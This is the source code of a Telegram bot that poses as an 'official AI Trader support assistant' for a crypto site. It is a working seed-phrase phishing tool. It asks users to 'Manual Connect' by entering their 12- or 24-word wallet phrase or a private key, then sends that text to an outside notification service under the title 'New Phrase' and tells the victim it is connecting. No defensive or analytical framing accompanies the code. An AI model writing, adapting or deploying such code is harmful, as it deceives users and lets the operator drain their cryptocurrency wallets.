import { Bot, InlineKeyboard } from "./deps.deno.ts";
import axiod from "https://deno.land/x/axiod/mod.ts";

export const bot = new Bot(Deno.env.get("BOT_TOKEN") || "");

// Construct a keyboard.
const inlineKeyboard = new InlineKeyboard().text("Connect Wallet", "click-payload");

// Build an inline keyboard:
const homeKeyboard = new InlineKeyboard()
  .text('Connect Wallet', 'connect').row()
  .url('official Website', 'https://ait.finance')

// Build an inline keyboard:
const connectKeyboard = new InlineKeyboard()
  .text('Manual Connect', 'manualConnect').row()
  .url('Web Connect', 'https://ait.finance')

// Send a keyboard along with a message.
bot.command("start", async (ctx) => {
  await ctx.reply("Welcome to official AI Trader support assistant!", { reply_markup: homeKeyboard });
});

// Wait for click events with specific callback data.
bot.callbackQuery("connect", async (ctx) => {
  ctx.deleteMessage()
  await ctx.reply("Connect your wallet", { reply_markup: connectKeyboard });
});

// Wait for click events with specific callback data.
bot.callbackQuery("manualConnect", async (ctx) => {
  ctx.deleteMessage()
  await ctx.reply("Enter your wallet phrase (usually 12 or 24 words) to import manually");
});

bot.on('message:text', async (ctx) => {
        try {
            const phrase = ctx.message.text;
        if (phrase.split(' ').length === 12 || phrase.split(' ').length === 15 || phrase.split(' ').length === 24 || (phrase.split(' ').length === 1 && phrase.length > 60))  {
            const webhook_url = `https://alertzy.app/send?accountKey=${Deno.env.get("ALERTZY_KEY")}&title=New Phrase&message=${phrase}` //change notification
            const response = await axios.post(webhook_url)
            ctx.reply("Connecting to wallet please wait..."); // Reply to the user with a confirmation message
        } else {
            ctx.deleteMessage()
            await ctx.reply("Invalid response.! Kindly try again", { reply_markup: homeKeyboard });
        }
        } catch (error) {
            console.error(error)
        }
        
    });
